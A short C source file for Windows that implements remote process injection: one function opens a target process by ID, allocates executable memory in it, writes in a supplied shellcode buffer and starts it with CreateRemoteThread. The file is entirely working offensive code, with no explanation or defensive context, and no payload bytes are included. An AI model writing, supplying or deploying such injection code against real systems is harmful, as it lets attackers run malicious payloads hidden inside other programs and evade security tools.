#include<stdio.h>
#include<stdlib.h>
#include<windows.h>
#include<string.h>

//function to inject shellcode
void inject_shellcode(unsigned char *shellcode,int shellcode_size,char *pid){
    DWORD target_pid =strtoul(pid,NULL,0);

    if(target_pid == 0)
        exit(0);
    
    HANDLE h_proc = OpenProcess((PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ),FALSE,target_pid);

    if(h_proc ==NULL)
        exit(0);
    
    //set up the buffer
    PVOID remote_buffer = VirtualAllocEx(h_proc,NULL,(SIZE_T) shellcode_size,(MEM_RESERVE | MEM_COMMIT),PAGE_EXECUTE_READWRITE);
    if(remote_buffer == NULL)
        exit(0);
    if(WriteProcessMemory(h_proc,remote_buffer,(PBYTE) shellcode,(SIZE_T) shellcode_size,NULL) == 0){
        exit(0);
    }
    //load and execute shellcode
    HANDLE h_remote_thread = CreateRemoteThread(h_proc,NULL,0,(LPTHREAD_START_ROUTINE) remote_buffer,NULL,0,NULL);
    if(h_remote_thread == NULL)
        exit(0);
    CloseHandle(h_proc);
}